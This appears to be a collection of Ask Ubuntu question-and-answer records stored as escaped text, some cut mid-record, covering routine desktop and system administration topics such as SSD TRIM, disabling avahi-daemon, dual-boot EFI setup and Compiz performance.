So I don't know if it works or not.\nThe Ubuntuwiki (first link) recommends manual trimming, so I set up a daily cronjob instead of discard:\n#!/bin/sh\nLOG=/var/log/batched_discard.log\necho \"*** $(date -R) ***\" >> $LOG\nfstrim -v / >> $LOG\n\nthe wiki article suggests weekly or daily. Now to my questions:\nHow often executes the automated trim?\nHow often is recommended?\nOnline vs. manual trimming?\nThank you for your help\n\nA: The difference between automatic and manual trim is that automatic trim (using the discard mount option) trims freed blocks on sync after any file is deleted, whereas manual trim (using fstrim) trims all the free space at once.\nTesting\nOne way you could test whether automatic trim is working would be to create and delete a large file:\nuser@host:/somewhere$ dd if=/dev/urandom bs=1M count=100 of=bigfile\nuser@host:/somewhere$ sync\nuser@host:/somewhere$ rm bigfile\nuser@host:/somewhere$ sync\n\nIf automatic discard is working, manually trimming again won't trim many blocks, since they should have already been trimmed. Run sudo discard -v on your filesystem and see how many blocks are trimmed.\nRecommendation\nAs for which is recommended: In my experience, automatic trim kills performance. However, this is probably hardware-dependent; it may be fine on your drive.\nIf you're using manual trim, as for how often, think about the rate at which you write data in your typical workload, compared to the amount of free space on your SSD. You want to trim sufficiently often, before your disk fills up with deleted data. If your SSD is mostly free space or your disk workload is light, trimming occasionally (weekly or even longer) should suffice. If your SSD is mostly full or you e.g. edit video files frequently, you'll need to trim more often.\n\nA: I trim my SSD on every boot. I made a sh file that is called 20 seconds after startup. I opted to display the output from fstrim in a system notification instead of a log file.\nfirst create the trim.sh file in your ~/bin directory\n#! /bin/sh\nnotify-send \"TRIM\" \"$(sudo fstrim -v /)\"\n\nNow we need to give the user privileges to run fstrim so we don't need to enter a password. Open your sudoers file with visudo and append the following line:\nyourusername  ALL=(ALL) NOPASSWD: /sbin/fstrim\n\nIf you include your home/yourusername/bin folder to your $PATH you also can trim manually in the terminal with the command 'trim' without the need for a password.\nNow you can add your script to the start up applications and specify a delay. You need to logout/login again so your new sudoers entry get loaded. \n\nA: I'm no storage engineer and I have related worries of my own, but I can make a possibly useful suggestion on scheduling. I'm pretty confident TRIM doesn't cause any worrisome wear on the SSD. It's just housekeeping that your disk will have to undergo eventually, before it can start recycling blocks. The best schedule for batch TRIMming would depend on usage; a function of writing frequency and free space, I should think. That in mind, I would unplug the cron job and fstrim -v by hand for several days.\nThe trick I think is to craft a schedule where batch TRIM prepares the SSD for writing before used blocks have to be recycled in order to fulfill a normal write operation, thus hurting performance. Wait 24 hours and fstrim. If it claims to have trimmed far fewer blocks than were free space, you're probably well served batch TRIMming less often than that.\n\nA: I prepared fstrim demon https://github.com/dobek/fstrimDemon\nIt seems to be more reliable to execute fstrim based on up time then cron table.

How can I disable avahi-daemon and can you explain to me how it runs if it appears as a service but it itsn't in rcN.d?\n\nYou can stop reading here. In fact, please do unless you want to TEACH a noob some Ubuntu. The question above should be clear enough to be answered. The rest is just me calling out for some more structured way of finding one's way around Ubuntu. I can more or less use other \"UNIX-like\" systems.\nI am a beginner so if I act nonsensically, consider me your daily WTF but do help me improve, please.\nAt every boot, /sbin/init seems to be launching a process called avahi-daemon\n# initctl list | grep avahi\navahi-daemon start/running, process 1280\n\nas user avahi\n# id avahi\nuid=107(avahi) gid=118(avahi) groups=118(avahi)\n\na ps -efww ef shows 2 processes active, both called avahi-daemon, and the PPID of the first avahi-daemon is indeed 1, the second process is just a child of the first. The PPID = 1 is what makes me think this was auto-started.\n\nOptionally:\nI don't really know how to check properly what gets executed at system startup, thinking about it.\nIs this the way to get a list of services that run at startup? initctl list | sort\n\nanyway, I seem to be able to temporarily stop this \"service\" through this command:\nservice avahi-daemon stop\n\nor indeed this command\n/etc/init.d/avahi-daemon stop\n\ndirectly, which is what this /usr/sbin/service seems to be using:\nenv -i LANG=\"$LANG\" PATH=\"$PATH\" TERM=\"$TERM\" \"$SERVICEDIR/$SERVICE\"\n\nWhen launched, the script reminds me that I am controlling an \"Upstart\" service, and that I should use the simpler invocation stop avahi-daemon. I guess I will need to learn about Upstart but for now, all I need to learn is this:\nhow do I disable services in Ubuntu?\nHere is what I tried (this should be the proper way to do it, or is it not?):\nupdate-rc.d avahi-daemon disable\n\nbut it complains:\nSystem start/stop links for /etc/init.d/avahi-daemon do not exist\n\nso I went hunting for the path to the binary:\n# Let me know if there is a better way to get the path above\nreadlink \"/proc/$(echo `ps --no-headers -o pid -C avahi-daemon | head -n 1`)/exe\"\n\nwhich is this:\n/usr/sbin/avahi-daemon\n\nand anything that could be considered an \"executable file\" in etc:\nfind /etc -type f -name '*avahi*' -perm -u+x\n\nthinking I would find startup scripts in /etc/rcN.d.

What exactly starts this beast? How to disable it without apt-get remove or apt-get purge?\nIt does not have too many resources open, as far as I can see:\nlsof -p $(echo `ps --no-headers -o pid -C avahi-daemon | head -n 1`)\n\nnor does it use too many CPU cycles, based on a quick glance at htop.\nI wrote this one-liner to see if it goes funky on CPU util over a period of one minute, and it never does, but let me know if there are better ways to check that:\nfor i in {1..59}; do ps -p $(echo `ps --no-headers -o pid -C avahi-daemon | head -n 1`) --no-headers -o pcpu; sleep 1; done\n\n\nA: You might not need to stop it from starting up when PC boots, but maybe prevent it from respawn as it does, when you kill it.\nSo, just comment out the respawn in /etc/init/avahi-daemon.conf\nKilling that process always failed, so couldn't get airmon-ng check to pass. Commenting out the respawning, it kills and never comes back hunting me.\n\nA: sudo systemctl disable avahi-daemon\n\nworked for me on Ubuntu Gnome 15.10\n\nA: Upstart startup scripts live in /etc/init, where you can find avahi-daemon.conf. All things listed in initctl list match to scripts in /etc/init, and they are not executable, thus your find missed them.\nTo disable a Upstart controlled service, see Upstart cookbook on disabling services: either add # to start on line, or use override files (example: sudo sh -c \"echo manual > /etc/init/avahi-daemon.override\").\n\nA: I found that even if I stop avahi-daemon (and avahi-daemon.socket), Firefox always restarts it. However, this works, and disables this annoying daemon permanently:\napt-get remove avahi-daemon\n\n\nA: service avahi-daemon stop\nUse this. Works wonders.\nThen use airmon-ng check wlo1 to check overlapping services. U should find none.\n\nA: You need to mask the socket to prevent applications starting avahi-daemon:\nsystemctl mask avahi-daemon.socket\nsystemctl disable avahi-daemon\nsystemctl stop avahi-daemon\n\n\nA: How about using\nsysv-rc-conf\nFor these thing?  It's very handy!\n(i.e. first install it with apt-get and then run it as sudo)\n\nA: Just used this and works fine on Ubuntu 16.04\nservice avahi-daemon stop\n\nI know the OP uses this line, but to summarize for who is searching for a simple command (like myself).\n\nA: Just purge it. \nOr disable it in rc3.d, rc4.d , and rc5.d \nSo as su / root\napt-get purge avahi-daemon\nyes\nThan it should be off your system. Check your /etc/rc3.d and others and it should be gone from startup.\nDon't use systemd for disable best way is to remove or change the runscript to K instead of S in the run layers.\n", "Q: Kompozer gives an error when runned under 12.10 amd64 I downloaded kompozer extracted it and  run kompozer like ./kompozer \nSo then I get this error in the gnome-terminal\nGtk-Message: Failed to load module \"overlay-scrollbar\"\n/usr/lib/gtk-2.0/2.10.0/menuproxies/libappmenu.so: wrong ELF-class: ELFCLASS64\n\n(kompozer-bin:8651): Gtk-WARNING **: Failed to load type module: /usr/lib/gtk-2.0/2.10.0/menuproxies/libappmenu.so\n\nHow can i get Kompozer to work under 12.10 amd64? \nnote: The error above had some dutch words in them so i translated it!\n\nA: I have the same problem with kompozer on ubuntu 12.10.\nBut, there is a solution to the problem.\nJust visit this link , and yes it is voor xubuntu but its the same solution for ubuntu.\nI just installed it and everything seems to be working fine.\n", "Q: Will installing OpenJDK 7 set it automatically as the default jre?

My question is, is there any reason that I would not want to use my GPG keys as authentication for SSH?\nPlease note that, while a have a little bit more experience with Linux, GPG, and SSH than the average computer user, I am by no means an expert.  Please be patient and point out any mistakes that you might see.\n\nA: No, it wouldn't. To put things simply, GPG and SSH do not use the same key format, which is a practical hurdle right from the start. Furthermore, the two key pairs might not have the same validity — you might want to repudiate one and not the other, or to have different SSH keys on different accounts but the same GPG key everywhere.\nThere's nothing to be gained by using the same key anyway. You'd have to convert the GPG key into an SSH key (assuming your GPG key is an RSA key in the first place!). At this point, you might as well generate a different key, since no tool is going to check one against the other.\n", "Q: How to create and submit package for Qt application I have an application that I developed in Qt and Ubuntu. Its primary target is Windows but I prefer working in Ubuntu for all sorts of obvious reasons, so I rebuild it using Qt under XP and create an installer that can be used in XP, Vista and W7. Given that it's developed under Ubuntu it seemed a logical step to see if I could also distribute it via the Ubuntu Software Centre. The plan would be to make a small charge for downloading.\nI registered in the Ubuntu Application Developer Programme, set up a MyApps account for the application and filled in the application details, marking it as to be uploaded later, but I am confused as to what to do next. According to the 'Publish (Uploading your app)' page, Canonical 'provides the packaging service free of charge', but I would welcome clarification on what I need to submit and how.\nAs I plan to charge for the package it presumably makes sense not to use an open source license, and this seems to imply that there is no need for me to create a Debian source package. Is this a correct assumption? If so, what would be required in the archive file and how should I submit it, bearing in mind that PPAs are for open-source software (unless I've misunderstood)?\nAs you can probably tell, software packaging is something I have virtually no experience of, so apologies if I'm asking obvious questions.

First, we will make sure that we have color enabled in our terminal. If you already see different colors for stuff in terminal, you can skip this step.\nEdit ~/.bashrc, and make sure to uncomment the following line, if it is commented (simply remove the leading #'s)\n#force_color_prompt=yes\n\nYou will have to close and re-open a terminal for this to take affect. Now that we have color in the terminal, a simple way to \"mark movies as watched\" would be to play with the permissions. \nIf your movies are all files, you could do something like setting the executable bit, which would make them green, by default. This shouldn't really be much of a security issue.\nchmod +x MyMovie.mkv\n\nIf your movies are stored in separate folders, and you want to mark the containing folder as watched, you could do something like adding the sticky bit, which means that only the owner/creator of the folder (and files within the folder) can delete/rename them. In a typical household scenario, this shouldn't pose any real security risks (in fact, it would be more secure). This will make the \"watched\" movie show up as white, with a blue background.\nchmod +t MyMovieFolder\n\n", "Q: Can't get movie player to play on my TV via HDMI connection I am running Ubuntu 12.10 on a Dell laptop.  laptop resolution is 1366x768.\nI connected to my Phillips 42\" TV using HDMI.

You should be able to drag the movie player over to your TV (either by going past the right or left of your screen), and watch it that way. If you want both of your displays to show the same thing, simply open up Displays (it's a setting/program), and check the \"Mirror Displays\" option.

Switching between the two is awkward with most motherboards, so it's best to get your systems installed in the same mode.\nBased on your description, your system is currently set up with the GUID Partition Table (GPT), which Microsoft requires to boot the computer in EFI mode. As user73855 says, GPT is required for over-2TiB disks, but it's also the preferred partitioning system on EFI-based computers. Linux can boot in BIOS mode from a GPT disk, but Windows can't.\nThe easiest way to proceed may be to re-install Ubuntu, but make sure the installer boots in EFI mode, not in BIOS mode. Check your computer's manual or boot messages to learn how to get a boot menu when you start up. It may provide two CD/DVD boot options, one to boot in BIOS (aka legacy) mode and the other to boot in EFI (or UEFI) mode. If you can find such an option, select the EFI/UEFI mode boot. Re-installing Ubuntu in this way should do the trick.\nIf you can't find such a firmware option, your task becomes harder. You should be able to manage by manually installing an EFI boot loader for Linux. I've written a Web page on this topic, so check it out to learn what's available and how to install one. Unfortunately, if you can't control the way your system boots an Ubuntu installer or other emergency Linux disc, you'll have to do the installation by renaming the Microsoft boot loader and installing your chosen boot loader using that name, at least temporarily.\nAn entirely different approach is to wipe everything on the disk and re-install both OSes in BIOS mode. This will require forcing the Windows installer to boot in that mode, though, which will be most easily accomplished if you can find a firmware option to control the installation medium's boot mode (BIOS vs. EFI). If you've got such an option, re-installing just Ubuntu in EFI mode will be easier than re-installing both OSes in BIOS mode.\nA final option is to install my rEFInd boot loader. Version 0.4.6 adds the ability to boot BIOS-mode OSes on firmwares that enable a switch. You'll need to change the scanfor option in the refind.conf file to include the hdbios option, though. You can install rEFInd from Windows (the documentation describes how) and make the change to refind.conf. When you're done, you should see a \"generic\" boot option appear for Ubuntu (it'll be labelled \"boot from HD\" or some such; I don't recall the exact wording). If you like, you can then make some additional changes to have rEFInd boot Linux more directly in any of several ways; see the \"Options for Booting Linux\" section of the rEFInd documentation.\n\nA: Translation: Si puedes, copiate esto en lugar de tu pregunta\nI have an asus k55VM.

It would be good to know what HDD do you have (size at least). MBR is for most of the HDDs. Though GPT and MBR should not be your concern, unless if the laptop is new. \nMSDOS format? I think that is for old partitions for old windows versions. NTFS is the used format for windows.\nYou can try to press SHIFT when booting up, that might bring grub up.\n[Depending if you have more than 1 HDD, the grub will be installed into one of those. And if the wrong HDD gets booted first, then no wonder grub does not start. \n(what i mean: HDD1+HDD2, install grub on HDD2, reboot, HDD1 loads because of BIOS, grub does not start)]\nThis is how I would do it: 1: start/install windows7 where you create 2 partitions, 60 GB ntfs for windows, and the rest empty space. Reboot. 2: Install Ubuntu, create 3 partitions, one for \"/\" root, one for /home, and 4 GB for SWAP, (root must be primary, the rest does not matter), and the rest you can make a \"shared\" ntfs partition. And importantly, install grub on the HDD. You can see the options, but instead of installing it on a partition, install it directly on /sda.\nChill down, don't worry, if possible give us screenshots, or more info, so we can help you. Cheers.\n-ESPAÑOL: bueno... no se que sucede, pero el GPT es para Discos Duros de mas de 2.2 TeraBytes. Seria bueno saber que tipo de DiscDur tienes (tamaño mas bien). MBR es para la mayoria de los DDs. Aunque no tendria que ver, a menos que sea nuevo el portatil.\nFormato MSDOS? Creo que eso es para versiones antiguas de windows. Actualmente se usa el NTFS (ya sabrás).\nPuedes intentar mantener pulsado el \"Mayús\" durante el arranque del pc, eso deberia sacar el GRUB.\n[Dependiendo si tienes mas de un DD, grub será instalado en uno de los 2 (como lo habrás puesto) Y si lo pusiste al segundo DD, entonces normal que el grub no será iniciado. \n(lo que quiero decir: DD1+DD2, instalando grub en DD2, reiniciar, DD1 se inicia porque el BIOS lo tiene configurado asi, y no sucede nada, y claro es porque, el grub fue instalado en el DD2)]\nAsí lo haría yo: 1: iniciar/instalar windows 7 nadamás empezar. Ahi te creas 60GB para windows (lo instalas ahi), NTFS, y el resto espacio sin usar. Reinicias. 2: Instalas Ubuntu, creas 3 particiones, uno para \"/\", uno para \"/home\" y 4 GB para SWAP, ( \"/\" debe ser primario, el resto no importa), y el resto lo puedes hacer una particion NTFS para usarlo conjunto con windows y linux. Y lo mas importante, ahi en el instalador, seleccionar donde instalar el GRUB.

Doing some photoshop work in windows was even a relief! This effect gets worse if I connect my external monitor.\nMy system is an intel pentium dual core T4500 with 4gb memory and a GeForce 8200M G/integrated/SSE2 graphics chip. Nothing fancy but should be able to run ok. My \"experience\" in ubuntu is set to standard. (MSI cr500 laptop)\nI've installed the nvidia drivers, tried current and experimental and the experimental drivers seem to perform a bit better but overall bad anyway. I set the mode to adaptive in the nvidia-settings tool and it goes to maximum setting directly and doesn't come back.\nUsing htop I found out that compiz or the X server always use a few percent of my cpu, more than I think it should and the time consumed is 5:18 for compiz, 4:33 for /usr/bin/X and 2:41 for google chrome(about 30 tabs open so not too strange I think.) What can I do to increase the visual performance cause this makes me not want to use ubuntu in public!\n\nA: On my system (13.04) the problem was with the compiz refresh rate, it is automatically set to 50hz, this is not enough, after changing it to 120hz and disabling the auto detection the interface is smooth.\nYou can change the refresh rate in the compizconfig settings manager.\nThe bad thing is that the refresh rate is always set to 50hz after a restart of the system.\nSeems to be this bug: Incorrect (low/stuttering) refresh rate with NVIDIA driver \n\nA: I'm inexperienced with nVidia, but you could:\n1: Check in CCSM (compiz config settings manager) for the OpenGL, and play around a bit with the configs. (in my case, ati, the sync to vblanc used to produce tearing). CCSM might not be installed by default.\n2: You could try the closed or open sourced drivers. This page might help: https://help.ubuntu.com/community/BinaryDriverHowto/Nvidia\nGood luck!\nCheers.\n\nA: My experience was the same in 12.04 on my desktop (Nvidia Geforce 230) and laptop (Nvidia Geforce 9300M). \nThough there has been much worked on Unity performance in the oneiric cycle I would consider low end Nvidia graphics cards to slow, when you are expecting to run a desktop at 60 fps. By \"low end\" I mean every model with a 4 or lower as the second number from the left in the model number (X4XX or X4X). This applies for the 200 series and below, but even the 400 series and newer low end cards are mostly rebranded versions of older stripped down designs.\nIntel's IGP in Sandy Bridge and Ivy Bridge CPUs on the other side run fine and deliver a 60 fps like performance on the desktop compared to the 24 fps (fluid, but rather sluggish) like performance of Nvidia's low end cards. This may just be a driver issue but it's a long standing one like KMS support for the binary driver. Probably even caused by that.\n\nA: I've found that disabling a number of options under the compizconfig settings manager makes it quite a bit faster:\nOpenGL>Untick Framebuffer object and Vertex buffer object (and possibly sync to VBlank) and change texture filter to fast.\nUbuntu Unity Plugin>Experimental>Change Dash Blur to No Blur\nAnimations>Either reduce the time of or change various animations (particularly the minimize ones), or disable them altogether.\nThis should make Unity much more usable. Xubuntu/XFCE or other environments are also an option.\nYou could also try using a different driver (e.g. nvidia-experimental-304), or one from the NVIDIA page:\nhttp://www.nvidia.com/object/unix.html\nBe sure to run nvidia-xconfig after installing one though, and add nomodeset to grub parameters.\n", "Q: Hard drives mount automatically I just upgraded to 12.10 and noticed that my media hard drives are mounting automatically.

(Later files override earlier ones)\n\n*\n\n*In KDE, you can set environment variables by putting shell scripts with .sh extensions in ~/.kde/env/ and making them executable.\n\n*In LXDE, you can set environment variables using export in ~/.xsessionrc\n\n\n*Add gtk-alternative-button-order = 0 to your ~/.gtkrc-2.0\nNot all applications obey button ordering instructions, but the ones that don't are usually GTK+ applications which hard-code \"OK on the right\"... so you probably won't notice.\n", "Q: Why does saidar and system monitor show different memory usage So i noticed that saidar and system monitor show different ram usage,\nat least i think it is ram usage.

If a startup menu comes up, select \"Try Ubuntu Without Installing on Your Computer\" to run as a Live Disc.\nNote older Ubuntu versions (before 12.10) may be burnt to a CD\n", "Q: how to run schooldays HQ in ubuntu? I have tried several times to run schooldays HQ through wine and virtualbox without much success, usually text appears but images and animation fails to appear on screen, how can I fix this?\n\nA: I finally found a good answer to my OWN question. Install the linux version of parallels (Workstation) in your machine and run a copy of windows 7 in it. Then install the CD of schooldays HQ in it. \nCheers.\nNote: Bear in mind that parallels, in the first place use YOUR system resources, you must have enough resources to run this game, secondly the cost of parallels is high and unless linux is your main OS I would think investing in a paid virtualization software  would not be profitable but that's up to you¡\n", "Q: How to map keys to launch URLs in Firefox? I'm looking for a way to launch some frequently used URLs in Firefox using short-cut keys. It would be a great time saver. \n\nA: Go to System Settings -> Keyboard -> Shortcuts -> Custom Shortcuts\nThen press \"+\" and add your new shortcut. And just type name and command\nFor example: \nAfter that you have to press this shortcut and change the keys\n", "Q: How do I pass an option to a Unity Shortcut? How can I pass an option from a Unity shortcut? For instance, can I invoke \"gnome-terminal --maximize\" instead of \"gnome-terminal\" from the Unity shortcut?\n\nA: One way might be to add a Quicklist for the parameters. You can find out how to do that here: What Custom Launchers and Unity Quicklists are available?\n\nA: If you want to pass the option every time you launch an app by clicking on the launcher in the launch bar, this is what you could do:\nInstall the app called \"Alacarte\" (also known as \"Main Menu\") from the Ubuntu Software Center. In this app, you can modify the command called by each launcher, or even create new custom launchers. I think you will like it.\n\nA: I don't know if by \"Unity shortcut\" you mean a launcher in the launch bar or any button in the Unity Dash. If you mean the latter, keep on reading.\nYou can \"launch\" (execute) commands from Unity with the keyboard shortcut Alt+F2. This opens up a \"Run a command\" interface, where your previous commands are conveniently remembered.\n\nA: First off, I apologize to Agmenor for my lack of understanding in his solution.\nI now see that the launchers you can modify in alacarte are the same items generated in Dash. Therefore, I was able to customize the terminal item and add the needed parameter, remove the existing Unity launcher, then add the launcher back after executing it from Dash. While this is still a little clunkier than I wanted ideally, it did work.\nI consider this question now solved. I will take the time to learn exactly what Alacarte is modifying and perhaps post a future self-answer with details on how to achieve the same effect with no extra tools.\nThank you to everyone who contributed to this solution.\n", "Q: How to fix \"No Operation System\" Error? So my CD drive is damaged, and I wanted to format my PC with a bootable USB with Ubuntu on it. \nEverything was ok, I created my bootable USB but when I tried to boot from it, a massage appeared saying: \n\nNO OPERATION SYSTEM\n\nWhat should I do?\n\nA: Have you tried checking if your BIOS can support bootable USBs? \nIf yes, you have to make sure that you change the boot order of your BIOS and that USB is first. Restart your computer and by then your system will detect your bootable USB and proceeds with the installation.\nYou may want to do some research about changing the boot order if you're confused on how to do that.\nOr you can check it from here:\nhttp://pcsupport.about.com/od/tipstricks/ht/bootusbflash.htm\nHope this helps.\n\nA: Perhaps you didn't set the machine boot sequence in the bios to boot from usb. Based on your machine, you should be able to get into your bios via f2 or esc key. Once in, set your boot sequence to be usb first and save/exit the bios. Machine should boot using the usb where you can perform the installation. Good luck.\n", "Q: Ubuntu 12.04 - Swiching Multiple Windows from a Program I'm having problem switching multiple windows from a same program. \nFor example, if I have 2 windows opened for Firefox at the same time and I wanted to switch from one another, it used to display a 2 small grid preview for each session when I click on the icon. However, that function doesn't seem to be working on my ubuntu 12.04 now. It doesn't response when I click on the Firefox (or other application) icon in the sidebar. Does anyone know how to fix this?\nBy the way, I know ALT+TAB can switch windows too, but it's hard to switch if I have 7 pdf documents opened at the same time. So I really wish to have this feature fixed. \nThanks in advance.\n\nA: You don't want to use Alt+tab to switch between windows of the same type. Instead of tab use the button directly above it, which can be different between keyboard layouts. alt+ButtonAboveTab does the same thing that Alt+tab does, except directly between windows of that application. \nAlso, using super+number of item will bring up the switcher. For instance, if Nautilus is directly below the Ubuntu button and you have more than Nautilus window open, press super+1 to focus Nautilus and than again to view all windows. \n", "Q: HighPoint RocketRAID 62x Controller I have the subject card recently installed in Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-31-generic x86_64).

Alternatively, since the original post got so little attention, I'm wondering if these types of problems are beyond the scope of this particular forum, and if anyone has ideas regarding the best place to ask this question, I'd welcome seeing those too.\nLastly, could someone explain this bounty business a little better?

I'm assuming all that they do is make a image and uses an automation script that allows this to be done.\nI have seen where clonezilla does this, but it has to be the same HDD size or they might have problems down the road. \nIs there any other freeware that I could do this with that allows you to use on any size disk.\nGhost is really good for this because it automatically fills up empty space with the partition and never needs any user input or \"Expert Mode\" like clonezilla. But it is not freeware.\n\nA: There are bunch of tools but i don't know whether they will be appropriate to you , but \nat-least you can give it a try !\nplease refer these :-\nhttp://www.howtogeek.com/wiki/Open_Source_or_Free_Disk_Cloning_Utilities\nhttp://en.wikipedia.org/wiki/Comparison_of_disk_cloning_software\n\nA: Recovery disks became necessary for Windows users, once manufacturers stopped including OEM install CDs and moved recovery images to a partition on the hard drive. Many Windows users don't know this and find out the hard way once their hard drive dies. This model doesn't really apply to Ubuntu, you just go to Ubuntu.com and download it.  \nFor a backup of the OS, you have a few options. \n\n\n*\n\n*You can just give them a standard Ubuntu disc you burned to reinstall from.\n\n*You can make a custom Live CD/DVD to give them, tailoring languages\nand applications as you like.  \n\n*You can even buy pressed CDs and DVDs from Canonical that look\nmore professional (this is what I do).  \n\n*Another option is to do an OEM Ubuntu install for them, but\nthis requires that you do most of the work and then hand them the\ncomputer once it's almost restored.  \n\n\nNext you need to address how you back up their data and settings. This is usually all contained in /home(verify this is correct, some people have weird set ups). Use the built-in Backup utility to save everything, it works perfectly and you can schedule automatic backups. Save backups to a partition on the same drive, to Ubuntu One, or to an different drive using the built-in Backup utility. Just choose which destination you want in Settings -> Backup -> Storage -> Backup location. Make it automatic, with regularly scheduled backups run.\nIf you really want to make things easy for customers, you should create your own documentation with easy to follow steps and screenshots. Set everything up correctly, include clear instructions, and offer hourly paid support as an option for those that want it.  \nIf this is all too complicated and you just want to clone the drives that has already been asked, some duplicates are here 1, 2, 3.

I've got a few machines which I'm upgrading from version to version for a few years.\nI'm curious to find out what was the original version of Ubuntu installed on the machine.\nIs there a way to do that?\n\nA: Yet another option: by default /etc/apt/sources.list contains the name of the CD from which the system was installed:\n> cat /etc/apt/sources.list|grep cdrom\n# deb cdrom:[Kubuntu-KDE4 8.04 _Hardy Heron_ - Release amd64 (20080423)]/ hardy main restricted\n\nwhich even works on a VPS which I'm sure never been actually installed from a cdrom:\n# deb cdrom:[Ubuntu-Server 10.04.2 LTS _Lucid Lynx_ - Release i386 (20110211.1)]/ lucid main restricted\n\nOf course, /etc/apt/sources.list is relatively less hidden than anything in /var/log/installer, so chances are it had been edited manually and the cdrom entry was modified/removed.\nThe same data can be seen in Software Sources dialog:\n\n\nA: You can see that when you report a bug using ubuntu-bug. For instance, you can press Alt+F2 and enter ubuntu-bug firefox. It'll start collecting info about your system which you can review. Among those is \"Installation Media\", which will show how it was originally installed. Then you just cancel the bug report, of course. \nI'm not sure where apport gets this information, so someone will probably post a better answer.

Just look and see what the time stamps are on some of the oldest files. For example, a file with a last modified dated of Jun 2010 may indicate Ubuntu 10.04.\nObviously this isn't a foolproof system, because some files can be copied onto a system with older dates than the existence of the installed Operating System.

But unfortunately the upgrade fails because I don't have enough free space for the temporary files. \nCould you tell me how to make room for the upgrade?\nOn Windows, you would use Disk Cleanup to empty some space.\nBut how can I do this on Ubuntu?

My family might be buying a Windows Surface tablet with Windows RT (Nvidia)? I was wondering if I can run Ubuntu or WUBI on it for my homework? \n\nA: In short, it doesn't look likely without some extreme hacking that nobody has done.\n\nMicrosoft have deliberately nobbled the Windows 8 specification so that this can't happen on ARM-based machines.\nTo be Windows 8 RT compatible (ARM machines only) it must not be possible to disable or reconfigure secure boot. So if you have an ARM machine that can run Windows 8 RT then it can only run an operating system signed by Microsoft.\nSo the Surface RT is like all other Windows 8 RT in that it's very much a device for muggles and mouse mittens; no Linux or BSD wizardry allowed, no dual-booting hacked-up iOS and no Android either. I can understand why they'd do this because most people are pointers and clickers, but it's not a machine for tech-heads.\nThe Surface Pro has an Intel i5 machine so hopefully Ubuntu 13.04 will support it of the box, if it does then I'll get one.\n\nSource:\nWindows Phone Central Forums\n\nA: Since on the RT tablet I would say no, since Microsoft requires secure keys in order to boot up it. It would probably on a standard Windows 8 tablet though, since the secure boot is an optional thing for OEM's, unlike the mandatory one for the Surface. \nHere is a similar question\nhttp://www.reddit.com/r/linux/comments/1229uw/question_linux_on_a_windows_surface_tablet/\n\nA: Yes: Microsoft recently leaked so-called \"golden keys\" used to (essentially) disable secure boot on RT devices.\nThis makes it possible to run Ubuntu on RT devices; how to do it would be a nice follow-up question, and there doesn't seem to be many guides out there.\n\nA: I'm not sure if this would work but if you\n\n\n*\n\n*Go to your settings go to \"Change PC Settings\"\n\n*And \"Devices\"\n\n*Then to \"Recovery\"\n\n*And look under \"Advanced startup\" and you might be able to try and start your surface using a usb with Ubuntu on it \n\n", "Q: Kernel Update : Kvm disabled by bios I read a text about kernel stable and I updated my kernel to 3.6.1.

A bit (or maybe a lot) like the StackExchange markup, but with conversion to PDF and Word documents. I am producing a lot of documentation for the statistical analyses I am doing, and this documentation is then passed on to scientists who work predominantly with Word. Requirements:\n\n\n*\n\n*basic markup (document structure, bold, italic)\n\n*chunks of code or preformatted text (syntax highlighting a plus)\n\n*including external images in the viewer\n\n*export to PDF and Word DOC/DOCX/RTF (HTML a plus)\n\n\nI am considering writing a few LaTeX based Perl scripts for myself, but maybe there is software like that already out there?\n\nA: You might want to look at rst (ReStructuredText). This is a markup language much used for python documentation. \nThere are many tools that can work with rst and convert it into many formats. \nOne tool is sphinx which can convert to html, latex->pdf, rtf, and man pages. \nBut there is e.g. also the docutils package, which has tools to convert the rst file into many formats:\n\n\n*\n\n*rst2html\n\n*rst2xml\n\n*rst2latex\n\n*rst2odt\n\n*rst2s5\n\n*rst2man\n\n\nYou are most probably interested in rst2latex, which can then be compiled to pdf. Or you can use this software to do this in a single step: rst2pdf. \nAnd you might want to use rst2odt, which produces the libreoffice/openoffice version of a word document which can then be converted by these to doc format. \n\nA: Sphinx is a tool initially used to create documentation for Python programming language. It is written in Python and has a lot of Python-specific features, but generally can be used to create any kind of \"narrative\" documentation with (optionally) table of contents, cross-references, search, syntax highlighting for code blocks and many other useful features.\nIt uses reStructuredText as input format, which is quite similar to Stack Exchange markup, only has more features.\nSphinx can generate one long HTML document, a whole \"website\" containing many pages or a PDF \"book\".

I did a bit of googling and it turns out the server could be reading a different php.ini file and to check the 'Loaded configuration' section of phpinfo.  So I did.\nIt reports that it is loading the same file I looked at, and it (phpinfo) also reports magic_quotes_gpc as being on.\nDoes anyone know what could be causing two seperate entities (joomla setup and phpinfo) to report it as 'On' but php.ini shows it as off?\nEDIT:  I figured out what was going on.  There was an error earlier in php.ini which was causing the server not to parse the rest of the file.\n\nA: Here's the solution.\nHad it not been to install Joomla 3, I wouldn't have taken the trouble to check this out :)\nFirst, the file to modify is \n\n/etc/php5/apache2/php.ini\n\nWe are supposed to turn off magic quotes so that the line looks like this:\nmagic_quotes_gpc = Off\n\nThe above change was on line 756 for my version.\nBut this change had no effect since the block starting at line 99 had errors.

After plugging into the USB, it asks to choose the operating mode: flash-drive, webcam, serial, etc. After I choose Flash-drive, the phone hangs, nothing mounts and there appears a strange empty mounted directory inside /media.\nThe solution that worked in my case, was to uninstall the usb_modeswitch package. It handles such multipurpose devices, and switches them from usb-storage to usbserial mode.\n\nA: I had the same problem with my Sony Ericsson Xperia ray connected by usb with my laptop running Ubuntu Gnome Remix 12.10. Tested with Suse 12.2 and (brrrrr) Windows XP - no problem there.\nAfter the news that Canonical would take over responsibility for kernel 3.5, I got the idea to update to a kernel from the 3.6-branch. I took the kernel 3.6.6 from UpUbuntu http://www.upubuntu.com/2012/11/install-linux-kernel-366-in-ubuntu.html and now it works again.

